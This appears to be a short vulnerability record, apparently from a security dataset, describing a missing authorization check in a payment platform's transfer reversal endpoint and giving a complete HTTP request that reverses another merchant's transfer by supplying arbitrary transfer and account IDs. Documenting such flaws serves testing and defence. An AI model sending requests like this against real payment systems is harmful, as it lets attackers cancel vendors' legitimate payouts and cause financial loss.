diagnosis: The transfer reversal endpoint allows clients to reverse transfers using arbitrary transferId and stripeAccountId without verifying whether the requesting user is the merchant who received the transfer or an administrator with financial oversight. An attacker can trigger reversals that cancel legitimate transfers on behalf of other vendors.
exploit_request:
POST /api/connect/transfers/reverse HTTP/1.1
Host: payments.escrowplatform.io
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json

{
  "transferId": "tr_1K00TargetMerchantTransfer",
  "amount": 2500.00,
  "stripeAccountId": "acct_1K00MerchantTarget"
}
